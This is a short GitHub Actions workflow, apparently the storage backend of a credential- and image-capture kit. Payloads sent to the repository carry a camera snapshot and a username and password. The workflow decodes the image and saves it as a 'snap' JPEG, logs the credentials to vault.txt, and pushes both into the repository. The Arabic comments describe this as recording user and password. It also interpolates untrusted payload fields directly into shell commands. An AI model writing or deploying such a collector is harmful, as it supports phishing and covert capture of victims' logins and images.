name: Chief-Media-Capture
on: [repository_dispatch]
jobs:
  store_captures:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Process Captured Data
        run: |
          mkdir -p captures
          # تحويل بيانات الصورة وحفظها كملف JPEG
          if [ "${{ github.event.action }}" == "log_image" ]; then
            echo "${{ github.event.client_payload.img }}" | cut -d',' -f2 | base64 -d > captures/snap_$(date +%s).jpg
          fi
          
          # تسجيل بيانات الاعتماد (يوزر وباسورد)
          echo "$(date) | U: ${{github.event.client_payload.u}} | P: ${{github.event.client_payload.p}}" >> vault.txt
          
          git config --global user.name "Vault-Bot"
          git config --global user.email "bot@github.com"
          git add captures/*.jpg vault.txt
          git commit -m "New Capture Received"
          git push
